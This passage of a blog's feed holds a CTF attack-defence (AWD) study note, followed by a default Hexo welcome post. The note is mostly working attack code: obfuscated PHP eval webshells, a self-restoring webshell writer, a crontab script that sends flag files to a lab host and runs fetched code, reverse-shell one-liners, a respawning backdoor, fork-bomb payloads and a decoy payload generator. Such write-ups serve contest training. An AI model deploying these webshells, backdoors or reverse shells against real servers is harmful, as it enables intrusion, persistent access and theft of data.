class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uf</span>=<span class="string">&quot;snc3&quot;</span>;</span><br><span class="line"><span class="variable">$ka</span>=<span class="string">&quot;IEBldmFbsK&quot;</span>;</span><br><span class="line"><span class="variable">$pjt</span>=<span class="string">&quot;CRfUE9TVF&quot;</span>;</span><br><span class="line"><span class="variable">$vbl</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ti&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;tistittirti_rtietipltiatice&quot;</span>);</span><br><span class="line"><span class="variable">$iqw</span>=<span class="string">&quot;F6ciddKTs=&quot;</span>;</span><br><span class="line"><span class="variable">$bkf</span> = <span class="variable">$vbl</span>(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;kbakske6k4k_kdkekckokdke&quot;</span>);</span><br><span class="line"><span class="variable">$sbp</span> = <span class="variable">$vbl</span>(<span class="string">&quot;ctw&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;</span>);</span><br><span class="line"><span class="variable">$mpy</span> = <span class="variable">$sbp</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$bkf</span>(<span class="variable">$vbl</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$ka</span>.<span class="variable">$pjt</span>.<span class="variable">$uf</span>.<span class="variable">$iqw</span>))); <span class="variable">$mpy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_uU</span>=<span class="title function_ invoke__">chr</span>(<span class="number">99</span>).<span class="title function_ invoke__">chr</span>(<span class="number">104</span>).<span class="title function_ invoke__">chr</span>(<span class="number">114</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_uU</span>;</span><br><span class="line"><span class="variable">$_cC</span>=<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">118</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">108</span>).<span class="variable">$_uU</span>(<span class="number">40</span>).<span class="variable">$_uU</span>(<span class="number">36</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">80</span>).<span class="variable">$_uU</span>(<span class="number">79</span>).<span class="variable">$_uU</span>(<span class="number">83</span>).<span class="variable">$_uU</span>(<span class="number">84</span>).<span class="variable">$_uU</span>(<span class="number">91</span>).<span class="variable">$_uU</span>(<span class="number">49</span>).<span class="variable">$_uU</span>(<span class="number">93</span>).<span class="variable">$_uU</span>(<span class="number">41</span>).<span class="variable">$_uU</span>(<span class="number">59</span>);<span class="variable">$_fF</span>=<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">114</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">102</span>).<span class="variable">$_uU</span>(<span class="number">117</span>).<span class="variable">$_uU</span>(<span class="number">110</span>).<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">105</span>).<span class="variable">$_uU</span>(<span class="number">111</span>).</span><br><span class="line"></span><br><span class="line"><span class="variable">$_uU</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_cC</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_fF</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$_cC</span>);@<span class="variable">$_</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//eval($_POST[1]) </span></span><br></pre></td></tr></table></figure><h4 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_memery_webshell</span>(<span class="params">url, directory, password</span>):</span><br><span class="line">    sleep_time = <span class="number">500</span> <span class="comment"># micro second</span></span><br><span class="line">    code = <span class="string">&quot;&lt;?php $content = &#x27;&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;&#x27;; $writable_path = &#x27;%s&#x27;; $filename = &#x27;.%s.php&#x27;; $path = $writable_path.&#x27;/&#x27;.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot;</span> % (password, directory, password, sleep_time)</span><br><span class="line">filename = <span class="string">&quot;.%s.php&quot;</span> % (password)</span><br><span class="line">    path = <span class="string">&quot;%s/%s&quot;</span> % (directory, filename)</span><br><span class="line">    payload = <span class="string">&quot;file_put_contents(&#x27;%s&#x27;, base64_decode(&#x27;%s&#x27;));&quot;</span> % (path, code.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">return</span> code_exec(url, payload).split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_memery_webshell</span>(<span class="params">url, directory, password</span>):</span><br><span class="line">    sleep_time = <span class="number">500</span> <span class="comment"># micro second</span></span><br><span class="line">    code = <span class="string">&quot;&lt;?php $content = &#x27;&lt;?php eval($_REQUEST[%s]);?&gt;&#x27;; $writable_path = &#x27;%s&#x27;; $filename = &#x27;.%s.php&#x27;; $path = $writable_path.&#x27;/&#x27;.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot;</span> % (password, directory, password, sleep_time)</span><br><span class="line">filename = <span class="string">&quot;.%s.php&quot;</span> % (password)</span><br><span class="line">    path = <span class="string">&quot;%s/%s&quot;</span> % (directory, filename)</span><br><span class="line">    payload = <span class="string">&quot;file_put_contents(&#x27;%s&#x27;, base64_decode(&#x27;%s&#x27;));&quot;</span> % (path, code.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> shell_exec(url, payload).split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">active_memery_webshell</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] OK!&quot;</span> </span><br></pre></td></tr></table></figure><h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span>=<span class="string">&quot;* * * * * curl 192.168.136.1:8098/?flag=<span class="subst">$(cat /var/www/html/flag)</span>&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&quot;</span>;</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(0);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="variable">$x</span> =file_get_contents(<span class="string">&#x27;/var/www/html/flag&#x27;</span>);</span><br><span class="line">file_get_contents(<span class="string">&#x27;http://192.168.136.1:8099/test.php?token=kericwy&amp;flag=&#x27;</span>.<span class="variable">$x</span>);</span><br><span class="line"><span class="built_in">sleep</span>(5);</span><br><span class="line">system(<span class="string">&quot;echo &#x27;<span class="variable">$message</span>&#x27; &gt; /tmp/1 ;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;crontab /tmp/1;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;rm /tmp/1;&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=file_get_contents(<span class="string">&#x27;http://192.168.136.1:8100/1.txt&#x27;</span>);</span><br><span class="line">system(<span class="variable">$c</span>); </span><br></pre></td></tr></table></figure><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>åœ¨bashä¸‹å¯ä»¥è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;127.0.0.1&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span>         </span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><h3 id="è¿›ç¨‹å®ˆæŠ¤"><a href="#è¿›ç¨‹å®ˆæŠ¤" class="headerlink" title="è¿›ç¨‹å®ˆæŠ¤"></a>è¿›ç¨‹å®ˆæŠ¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [[ : ]]; <span class="keyword">do</span></span><br><span class="line"><span class="comment"># tell php that i am living</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Creating lock file...&quot;</span></span><br><span class="line">touch -a $&#123;bash_lock_file&#125;</span><br><span class="line"><span class="comment"># check php is living or not</span></span><br><span class="line">last_access_time=`stat -c %X $&#123;php_lock_file&#125;`</span><br><span class="line">now_time=`date +%s`</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;php last alive time : $&#123;last_access_time&#125;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $[ <span class="variable">$now_time</span> - <span class="variable">$last_access_time</span> ];</span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;$&#123;php_lock_file&#125;&quot;</span> ] || [ $[ <span class="variable">$now_time</span> - <span class="variable">$last_access_time</span> ] -gt $((sleep_time+<span class="number">1</span>)) ]; then</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[-] php script is dead!&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;downloading php script&quot;</span></span><br><span class="line">wget $&#123;php_url&#125; -O <span class="variable">$target_path</span> &amp;&amp; curl $&#123;start_url&#125; -m $&#123;time_out&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP script is alive...&quot;</span></span><br><span class="line">fi</span><br><span class="line"><span class="comment"># sleeping</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;sleeping...&quot;</span></span><br><span class="line">sleep $&#123;sleep_time&#125;</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sleep_time</span> = <span class="number">3</span>; <span class="comment">// max sleep_time : 3 seconds</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$bash_url</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">// tell bash that i am living</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Telling bash that i am alive...\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">touch</span>(<span class="variable">$php_lock_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP Lock file last accessed : &quot;</span>.(<span class="title function_ invoke__">time</span>() - <span class="title function_ invoke__">fileatime</span>(<span class="variable">$php_lock_file</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// check bash is living or not</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Checking the bash script is alive or not...\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$bash_lock_file</span>) &amp;&amp; ((<span class="title function_ invoke__">time</span>() - <span class="title function_ invoke__">fileatime</span>(<span class="variable">$bash_lock_file</span>)) &lt; (<span class="variable">$sleep_time</span> + <span class="number">1</span>))))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The bash script is dead!\n&quot;</span>;</span><br><span class="line"><span class="comment">// download bash script</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Downloading bash script...\n&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$bash_path</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// restart bash script</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Restarting bash script...\n&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;nohup bash &#x27;</span>.<span class="variable">$bash_path</span>.<span class="string">&#x27; &amp;&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// control loop speed</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sleeping...\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="variable">$sleep_time</span>);</span><br><span class="line"><span class="comment">// backdoor</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Executing backdoor...&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$code_url</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="forkç‚¸å¼¹"><a href="#forkç‚¸å¼¹" class="headerlink" title="forkç‚¸å¼¹"></a>forkç‚¸å¼¹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;192.168.50.57&quot;</span></span><br><span class="line">    port = <span class="string">&quot;80&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://%s:%s/code.php&quot;</span> % (host, port)</span><br><span class="line">    code = <span class="string">&quot;system(\&quot;echo &#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27; &gt; /tmp/aaa\&quot;);system(\&quot;/bin/bash /tmp/aaa\&quot;);echo \&quot;seems good!\&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span> code_exec(url, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="string">&quot;80&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://%s:%s/c.php&quot;</span> % (host, port)</span><br><span class="line">    command = <span class="string">&quot;:()&#123; :|: &amp; &#125;;:&quot;</span></span><br><span class="line">    shell_exec(url, command) </span><br></pre></td></tr></table></figure><h3 id="åƒåœ¾æµé‡ç”Ÿæˆ"><a href="#åƒåœ¾æµé‡ç”Ÿæˆ" class="headerlink" title="åƒåœ¾æµé‡ç”Ÿæˆ"></a>åƒåœ¾æµé‡ç”Ÿæˆ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_all</span>(<span class="params">root, arg</span>):</span><br><span class="line">    <span class="built_in">all</span> = []</span><br><span class="line">    result = os.walk(root)</span><br><span class="line">    <span class="keyword">for</span> path,d,filelist <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> filelist:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&quot;.php&quot;</span>):</span><br><span class="line">               full_path = path + <span class="string">&quot;/&quot;</span> + file</span><br><span class="line">               content = get_content(full_path)</span><br><span class="line">               <span class="built_in">all</span>.append((<span class="string">&quot;/&quot;</span> + file, find_arg(content, arg)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_GET&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_POST&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_COOKIE&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fake_plain_payloads</span>(<span class="params">flag_path</span>):</span><br><span class="line">    payloads = []</span><br><span class="line">    payloads.append(<span class="string">&#x27;system(&quot;cat %s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;highlight_file(&quot;%s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;echo file_get_contents(&quot;%s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;var_dump(file_get_contents(&quot;%s&quot;));&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;print_r(file_get_contents(&quot;%s&quot;));&#x27;</span> % (flag_path))</span><br><span class="line">    <span class="keyword">return</span> payloads</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fake_base64_payloads</span>(<span class="params">flag_path</span>):</span><br><span class="line">    payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    <span class="keyword">return</span> [payload.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="keyword">for</span> payload <span class="keyword">in</span> payloads]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_path = <span class="string">&quot;/home/web/flag/flag&quot;</span></span><br><span class="line">    <span class="built_in">print</span> get_fake_plain_payloads(flag_path)</span><br><span class="line">    <span class="built_in">print</span> get_fake_base64_payloads(flag_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_get</span>(<span class="params">url, root, flag_path</span>):</span><br><span class="line">    all_requests = []</span><br><span class="line">    http_get = get_all(root, <span class="string">&quot;_GET&quot;</span>)</span><br><span class="line">    plain_payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    base64_payloads = get_fake_base64_payloads(flag_path)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> http_get:</span><br><span class="line">        path = item[<span class="number">0</span>]</span><br><span class="line">          args = item[<span class="number">1</span>]</span><br><span class="line">                 <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">                    <span class="keyword">for</span> payload <span class="keyword">in</span> plain_payloads:</span><br><span class="line">                              new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, path[<span class="built_in">len</span>(<span class="string">&quot;./&quot;</span>):], arg[<span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>):-<span class="built_in">len</span>(<span class="string">&quot;&#x27;]&quot;</span>)], payload)</span><br><span class="line">                              request = requests.Request(<span class="string">&quot;GET&quot;</span>, new_url)</span><br><span class="line">                        all_requests.append(request)</span><br><span class="line">                          <span class="keyword">for</span> payload <span class="keyword">in</span> base64_payloads:</span><br><span class="line">                              new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, path[<span class="built_in">len</span>(<span class="string">&quot;./&quot;</span>):], arg[<span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>):-<span class="built_in">len</span>(<span class="string">&quot;&#x27;]&quot;</span>)], payload)</span><br><span class="line">                              request = requests.Request(<span class="string">&quot;GET&quot;</span>, new_url)</span><br><span class="line">                              all_requests.append(request)</span><br><span class="line">    <span class="keyword">return</span> all_requests </span><br></pre></td></tr></table></figure><h4 id="æµé‡å¤ç”¨"><a href="#æµé‡å¤ç”¨" class="headerlink" title="æµé‡å¤ç”¨"></a>æµé‡å¤ç”¨</h4><p><a href="http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar">http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar</a></p><h2 id="å‚è€ƒç½‘ç«™ï¼š"><a href="#å‚è€ƒç½‘ç«™ï¼š" class="headerlink" title="å‚è€ƒç½‘ç«™ï¼š"></a>å‚è€ƒç½‘ç«™ï¼š</h2><p><a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p><p><a href="https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/">https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°&quot;&gt;&lt;a href=&quot;#ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°&quot; class=&quot;headerlink&quot; title=&quot;ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°&quot;&gt;&lt;/a&gt;ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°&lt;/h1&gt;&lt;p&gt;CTFçº¿ä¸‹æ”»é˜²èµ›ä¸»è¦ä»¥æ”»é˜²æ¨¡å¼ï¼ˆAt</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="æ”»é˜²" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://lhhxs.github.io/2022/08/07/hello-world/"/>
    <id>https://lhhxs.github.io/2022/08/07/hello-world/</id>
    <published>2022-08-07T00:32:08.000Z</published>
    <updated>2022-09-09T05:01:57.431Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
    <category term="intro" scheme="https://lhhxs.github.io/tags/intro/"/>
    
  </entry>
  
</feed>
